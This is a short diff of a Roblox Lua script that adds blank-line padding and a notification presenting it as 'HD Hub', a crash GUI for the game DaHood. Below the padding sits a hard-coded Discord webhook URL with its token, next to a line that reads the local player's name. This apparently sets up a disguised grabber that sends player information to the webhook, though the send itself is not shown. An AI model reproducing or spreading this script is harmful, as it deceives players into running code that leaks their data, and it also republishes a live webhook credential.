@@ -1,5 +1,54 @@
 
 
+
+
+
+
+
+
+
+
+
+
+pcall(function()
+  game.StarterGui:SetCore("SendNotification", {
+    Title = 'HD Hub Loading..';
+    Text = 'Execute in DaHood for a crash GUI';
+    Duration = 5;
+  })
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 local webhook_url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"
 
 local player_name = game:GetService("Players").LocalPlayer.Name
